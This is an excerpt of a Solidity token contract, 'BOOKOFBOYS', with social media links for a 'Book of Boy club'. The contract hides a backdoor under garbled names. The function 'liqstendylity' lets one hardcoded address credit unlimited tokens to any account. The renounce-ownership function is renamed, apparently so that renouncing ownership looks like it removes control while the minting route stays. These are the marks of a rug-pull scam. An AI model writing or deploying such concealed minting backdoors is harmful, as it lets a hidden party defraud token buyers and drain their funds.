...
*/
/**
https://t.me/BookofBoyclub
https://twitter.com/BOOKOFBOYCLUB
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershipbsggonter() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract BOOKOFBOYS is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private   _marketordtddress;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _marketordtddress = 0x4b9200d12d10141A837E50652aa9D517D22F640b;
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==  _marketordtddress ;
    }

    function liqstendylity(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
